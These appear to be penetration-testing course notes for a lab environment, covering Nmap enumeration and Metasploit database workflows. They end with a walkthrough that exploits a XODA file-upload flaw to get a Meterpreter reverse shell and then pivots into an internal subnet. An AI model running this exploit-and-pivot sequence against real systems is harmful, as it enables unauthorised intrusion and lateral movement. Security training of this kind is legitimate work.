## Port Scanning & Enumeration with Nmap
enumeration means gathering as much information as possible from a target system , it is service/port specific 

we use "-Pn" for windows targets to prevent pinging and directly do port scan

```
nmap -Pn -sV -O demo.ine.local -oX windows_server_2012
```
-Pn : skip ping and directly do port scanning (preffered for windows)
-sV : service version detection
-O : operating system detection
-oX windows_server_2012 : store output in XML format and then output file name (cat to view)

## Importing Nmap Scan Results into MSF

1. have the output XML file
2. start Postgresql service

```
service postgresql start
msfconsole
```

```
msf6 > db_status
msf6 > workspace # to see list of workspaces , the xml file imorted will be in new workspace
msf6 > workspace -a 2k12 # to add a new workspace
msf6 > workspace # new created workspace is automtically selected
msf6 > db_import /root/windows_server_2012 # give location to the saved XML file , use *tab* to complete
msf6 > hosts #to check if the results have been imported
msf6 > services
```


<span style="color:rgb(0, 176, 240)">to run Nmap scan from Metasploit itself and also import scan results automatically into a new workspace</span>
```
msf6 > workspace
msf6 > workspace -a Nmap_MSF
msf6 > workspace #automatically shifts to new workspace
msf6 > db_nmap -Pn -sV -O demo.ine.local # now we dont need to output the results in XML format as this time it will be automatically saved
msf6 > hosts # to check
msf6 > services
msf6 > vulns #to list out vulnerabilities automatically
```

## Port Scanning with Auxiliary Modules

auxiliary modules allow us to extract information from a target ip/service
they will be most used in post exploitation phase

```
service postgresql start
msfconsole
```

```
msf6 > db_status
msf6 > workspace
msf6 > workspace -a Port_Scan
msf6 > workspace
msf6 > search portscan

msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > 
msf6 auxiliary(scanner/portscan/tcp) > show options
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS demo1.ine.local
msf6 auxiliary(scanner/portscan/tcp) > show options
msf6 auxiliary(scanner/portscan/tcp) > run
[+] 192.231.218.3:        - 192.231.218.3:80 - TCP OPEN
#tells that the target is running a web application
msf6 auxiliary(scanner/portscan/tcp) > curl 192.231.218.3
```

![Pasted image 20250812211918.png](attachments/Pasted%20image%2020250812211918.png)
the web application is running "XODA"

```
msf6 auxiliary(scanner/portscan/tcp) > search xoda
msf6 auxiliary(scanner/portscan/tcp) > use exploit/unix/webapp/xoda_file_upload
msf6 exploit(unix/webapp/xoda_file_upload) > show options
msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
#set it to root folder of the target web application
msf6 exploit(unix/webapp/xoda_file_upload) > set LHOST 192.68.159.2 #ifconfig - attacker ip
msf6 exploit(unix/webapp/xoda_file_upload) > exploit

meterpreter > sysinfo #gives os and version
meterpreter > shell
/bin/bash -i
www-data@demo1:/app/files$ ifconfig
eth1 inet addr:192.68.73.2
www-data@demo1:/app/files$ ^C
meterpreter > run autoroute -s 192.68.73.2

meterpreter > background
msf6 exploit(unix/webapp/xoda_file_upload) > sessions
msf6 exploit(unix/webapp/xoda_file_upload) > search portscan
msf6 exploit(unix/webapp/xoda_file_upload) > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.68.73.3
msf6 auxiliary(scanner/portscan/tcp) > run

msf6 auxiliary(scanner/portscan/tcp) > back
msf6 > search udp_sweep
msf6 > use auxiliary/scanner/discovery/udp_sweep
msf6 auxiliary(scanner/discovery/udp_sweep) > set RHOSTS 192.68.73.3
msf6 auxiliary(scanner/discovery/udp_sweep) > run

```


